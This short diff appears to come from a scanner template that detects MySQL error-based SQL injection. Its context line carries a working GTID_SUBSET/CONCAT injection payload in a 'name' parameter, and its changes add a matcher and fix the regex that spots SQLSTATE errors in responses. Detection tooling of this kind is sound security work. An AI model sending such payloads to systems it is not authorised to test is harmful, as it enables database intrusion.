@@ -19,10 +19,10 @@ name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,MD5(1)))),0x7e),8475) AND '
 #@ condition: and
 #@ matcher: status_code == 200
 #@ matcher: header["Content-Type"] contains "text/html"
-#> extract: name=SQLSTATE, from=body, regex=/SQLSTATE\[[A-Z0-9]+]/
+#@ matcher: body matches /SQLSTATE\[[A-Z0-9]+\]/i
+#> extract: name=SQLSTATE, from=body, regex=/SQLSTATE\[[A-Z0-9]+\]/
 
 
 
 
-
-# @VEIL-STAMP: 6dca8569ed142e47e84ac1a58a990c94d2b9b9588de08c0ae44cc6b9f1064e41
+# @VEIL-STAMP: 8c563186ad6f9c4256e731dc9253c0c201f944c352bf90d06f61803091c1f84a
